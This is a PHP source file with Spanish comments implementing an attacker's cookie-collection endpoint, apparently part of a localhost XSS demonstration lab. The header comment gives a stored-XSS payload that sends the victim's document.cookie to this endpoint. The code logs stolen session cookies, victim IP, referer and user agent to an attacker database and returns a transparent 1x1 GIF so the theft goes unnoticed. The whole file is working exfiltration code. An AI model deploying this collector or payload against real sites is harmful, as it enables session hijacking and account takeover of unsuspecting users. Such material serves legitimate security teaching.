<?php
// ===========================================================================
//  ENDPOINT RECEPTOR DEL ATACANTE  —  http://localhost:5000/steal.php
// ---------------------------------------------------------------------------
//  El XSS almacenado inyectado en la intranet víctima (puerto 8080) ejecuta:
//
//     new Image().src =
//        "http://localhost:5000/steal.php?c=" + encodeURIComponent(document.cookie);
//
//  Cuando la VÍCTIMA (p. ej. el administrador con SESION_ID=1001) abre la
//  página con el comentario malicioso, su navegador carga esta "imagen" y
//  entrega aquí su cookie de sesión. La guardamos en la DB del atacante.
// ===========================================================================
require __DIR__ . '/db.php';

$cookie = $_GET['c'] ?? $_POST['c'] ?? '';
$origen = $_GET['u'] ?? ($_SERVER['HTTP_REFERER'] ?? 'desconocido');

if ($cookie !== '') {
    $db = evil_db();
    $stmt = $db->prepare("INSERT INTO capturas (fecha, ip_victima, origen, cookie, user_agent)
                          VALUES (?, ?, ?, ?, ?)");
    $stmt->execute([
        date('Y-m-d H:i:s'),
        $_SERVER['REMOTE_ADDR'] ?? '?',
        substr($origen, 0, 200),
        substr($cookie, 0, 500),
        substr($_SERVER['HTTP_USER_AGENT'] ?? '?', 0, 200),
    ]);
}

// Responder con un GIF transparente de 1x1 para que la víctima no note nada.
header('Content-Type: image/gif');
echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
